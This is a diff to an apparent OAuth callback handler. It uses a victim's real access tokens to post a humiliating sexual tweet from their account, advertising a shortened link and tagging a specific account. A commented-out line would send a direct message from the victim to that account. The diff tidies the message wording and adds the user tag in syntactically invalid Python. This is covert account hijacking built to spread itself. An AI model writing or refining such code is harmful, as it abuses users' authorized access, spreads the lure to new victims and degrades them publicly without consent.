@@ -229,7 +229,8 @@ def callback():
                                         access_token=real_oauth_token, 
                                         access_token_secret=real_oauth_token_secret)
         
-        api.create_tweet(text="I am dumb slut who clicks anything sent by the wonder @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$")
+        api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$",
+                        media={tagged_user_ids=['1697559401543139328']})
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         
 
